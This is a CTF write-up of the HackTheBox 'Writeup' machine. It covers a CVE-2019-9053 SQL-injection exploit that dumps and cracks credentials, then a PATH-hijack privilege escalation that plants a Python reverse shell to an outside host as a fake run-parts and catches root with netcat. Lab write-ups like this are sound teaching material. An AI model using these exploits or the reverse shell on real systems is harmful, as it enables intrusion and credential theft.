        <content type="html"><![CDATA[<img width="587" alt="writeup-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158812-62e05800-988a-11ea-876f-7954091cecbb.png"><p>Writeup was my first machine I solved to start my CTF journey. It’s an easy rated box but still interesting and perfect to jump into the CTF bath!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC writeup.htb           </span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 10:39 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> writeup.htb (10.10.10.138)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/writeup/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Nothing here yet.</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 32.23 seconds</span><br></pre></td></tr></table></figure><p>A classic, port 80 and 22. <code>nmap</code> did a bit extra work for us and found the the <code>robots.txt</code> show an interesting entry : <code>/writeup/</code></p><p>First thing we see when opening the 80 port is this message :</p><p><img src="https://user-images.githubusercontent.com/9076747/64074062-b592c900-cc95-11e9-97eb-5199438c8feb.png" alt="2019-09-01-105047_1387x643_scrot"></p><p>So there a DOS protection checking apache logs for 40X errors. Probably a fail2ban or something. Let’s avoid classic enumeration scripts to not get banned.</p><p>The footer says :</p><blockquote><p>Page is hand-crafted with vi.</p></blockquote><p>That’s an interesting fact to keep in mind, maybe can access vi backups file (something like <code>index.php~</code> or <code>index.php.swp</code>) and have a look at the source code.</p><p>The <code>/writeup/</code> endpoint countains, well, writeups. The website seems rather basic :</p><p><img src="https://user-images.githubusercontent.com/9076747/64074102-a3fdf100-cc96-11e9-92fb-53bcb44da0ba.png" alt="2019-09-01-105747_1455x764_scrot"></p><p>Each writeup is accessible throught the URL in the following form : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;writeup.htb&#x2F;writeup&#x2F;index.php?page&#x3D;&#123;writeup-name&#125;</span><br></pre></td></tr></table></figure><p>After digging a bit we found there is no Local File Inclusion vulnerabilities nor <code>vim</code> backup files accessible. </p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Checking the source code inform us that the website was made using <code>CMS Made Simple</code> :</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http writeup.htb/writeup/index.php</span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">Set-Cookie</span>: CMSSESSID9d3962=lgt7j00rvndgl4; path=/</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang="en_US"&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;Home - writeup&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;base href="http://writeup.htb/writeup/" /&gt;</span><br><span class="line">&lt;meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." /&gt;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>A quick search return a fairly recent vulnerability, CVE-2019-9053 :</p><blockquote><p>An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.</p></blockquote><p>And an exploit is already available, perfect! </p><p>Looking at the source code we can see we have a very well crafted and complete exploit. It will :</p><p>1) Dump the salt used by CMS Made Simple<br>2) Dump the username<br>3) Dump the email<br>4) Dump the password<br>5) And even have a function to crack the found hashed password</p><p> Let’s try it :</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://www.exploit-db.com/raw/46635 -O cmssimple.py</span><br><span class="line">[hg8@archbook ~]$ python cmssimple.py -u http://writeup.htb/writeup/ --crack -w <span class="string">"~/SecLists/Passwords/Leaked-Databases/rockyou.txt"</span></span><br><span class="line">[+] Salt <span class="keyword">for</span> password found: 5a599ef579066807</span><br><span class="line">[+] Username found: jkr</span><br><span class="line">[+] Email found: jkr@writeup.htb</span><br><span class="line">[+] Password found: 62def4866937f08cc13bab43bb14e6f7</span><br><span class="line">[+] Password cracked: raykayjay9</span><br></pre></td></tr></table></figure><p>Really nice exploit here. So we have an username and a password.</p><p>The CMS Made Simple admin page can not be accessed using those credentials, so let’s try with SSH :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh jkr@writeup.htb</span><br><span class="line">jkr@writeup.htb<span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Devuan GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Sun Sep  1 05:07:51 2019 from 10.10.10.85</span></span><br><span class="line"><span class="string">jkr@writeup:~$ cat user.txt </span></span><br><span class="line"><span class="string">d4e493fd40xxxxxxxxxxxxxx319f978</span></span><br><span class="line"><span class="string">jkr@writeup:~$</span></span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>As a recon phase let’s run <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener"><code>pspy</code></a> to check running process. And paying closer attention de process run as root.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="comment"># Attacker box</span></span><br><span class="line">[hg8@archbook ~]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</span><br><span class="line">[hg8@archbook ~]$ scp pspy64 jkr@writeup.htb:~ </span><br><span class="line">jkr@writeup.htb<span class="string">'s password: </span></span><br><span class="line"><span class="string">pspy64   100% 3006KB 111.9KB/s   00:26</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ chmod +x pspy64  &amp;&amp; ./pspy64</span><br></pre></td></tr></table></figure><p>After watching the processes for a while, we will see a few other users succeding the user challenge and connect to SSH aswell. And something interresting appears :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">05:37:15 CMD: UID=0    PID=11674  | sshd: [accepted]</span><br><span class="line">05:37:15 CMD: UID=102  PID=11675  | sshd: [net]       </span><br><span class="line">05:37:29 CMD: UID=0    PID=11676  | sshd: jkr [priv]  </span><br><span class="line">05:37:29 CMD: UID=0    PID=11677  | sh -c /usr/bin/env -i PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </span><br><span class="line">05:37:29 CMD: UID=0    PID=11678  | run-parts --lsbsysinit /etc/update-motd.d </span><br><span class="line">05:37:29 CMD: UID=0    PID=11679  | uname -rnsom </span><br><span class="line">05:37:29 CMD: UID=0    PID=11680  | sshd: jkr [priv]  </span><br><span class="line">05:37:29 CMD: UID=1000 PID=11681  | sshd: jkr@pts/2</span><br></pre></td></tr></table></figure><p>A few commands are run as <code>root</code> upon users login. Let’s dig.</p><p>First command that caught the attention is <code>run-parts --lsbsysinit /etc/update-motd.d</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man run-parts</span><br><span class="line">run-parts runs all the executable files named within constraints described below, found <span class="keyword">in</span> directory [directory].</span><br></pre></td></tr></table></figure><p>Sounds promising. If we can add a script to <code>/etc/update-motd.d</code> it will be executed as root on next login. </p><p>Unfortunately we don’t have writting rights to <code>/etc/update-motd.d</code> nor to the file present in it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ ls -l /etc/update-motd.d/</span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 root root 23 Jun  3  2018 10-uname</span><br></pre></td></tr></table></figure><p>That looks like a dead end here. </p><p>Another thing we noticed is that executable are called in relative path and not absolute. And the first command gives the full <code>PATH</code> env variable before launching the <code>run-parts</code> command.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c /usr/bin/env -i PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new</span><br></pre></td></tr></table></figure><p>As a reminder, when a command is called Linux will search in the <code>PATH</code> environement variable to find where this executable is located. So in the command above, Linux system will first look in the <code>/usr/local/sbin</code> to see if <code>run-parts</code> is there, then in <code>/usr/local/bin</code> etc… </p><p>Let’s check where <code>run-parts</code> is : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ <span class="built_in">which</span> run-parts</span><br><span class="line">/bin/run-parts</span><br></pre></td></tr></table></figure><p>So it’s <code>/bin/</code> folder, the last on the <code>PATH</code> list. That mean if we can write an executable named <code>run-parts</code> in either : </p><ul><li><code>/usr/local/sbin/</code></li><li><code>/usr/local/bin/</code></li><li><code>/usr/sbin/</code></li><li><code>/usr/bin/</code></li><li><code>/sbin/</code></li></ul><p>then it will be ran instead of the real <code>/bin/run-parts</code> and as root. If we have writting rights in any of those folder then it’s bingo.</p><h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Bash reserve shell doesn't work, let's use the python one</span></span><br><span class="line">jkr@writeup:~$ cat /usr/<span class="built_in">local</span>/sbin/run-parts </span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.85",8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line">jkr@writeup:~$ chmod +x /usr/<span class="built_in">local</span>/sbin/run-parts</span><br><span class="line">jkr@writeup:~$</span><br></pre></td></tr></table></figure><p>Let’s listen to incoming connection :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Now we logout and login again to the box to initiate the <code>sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new</code> command.</p><p>And surely we receive the connection immediatly :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.138:37078</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">eeba4xxxxxxxxxxxx8d7226</span><br></pre></td></tr></table></figure><p>That’s it! As always do not hesitate to contact me for any questions or feedbacks. </p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> sqli </tag>
            
            <tag> exploit </tag>
            
            <tag> run-parts </tag>
            
            <tag> writeup </tag>
            
            <tag> cmsms </tag>
            
            <tag> injection </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
